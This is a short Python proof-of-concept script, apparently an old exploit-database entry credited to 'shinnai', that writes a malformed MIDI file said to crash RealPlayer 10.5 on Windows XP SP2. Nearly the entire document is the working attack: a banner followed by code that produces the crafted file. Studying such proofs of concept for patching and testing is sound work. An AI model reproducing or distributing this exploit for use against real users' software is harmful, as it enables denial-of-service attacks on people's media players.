print "-----------------------------------------------------------------------"
print "# RealPlayer 10.5 .mid file Denial of Service"
print "# author: shinnai"
print "# mail: shinnai[at]autistici[dot]org"
print "# site: http://shinnai.altervista.org"
print "# Tested on Windows XP Professional SP2 all patched"
print "-----------------------------------------------------------------------"

fileOut = open('PoC.mid','wb')
fileOut.write('\x4D\x54\x68\x64\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00')
fileOut.close()

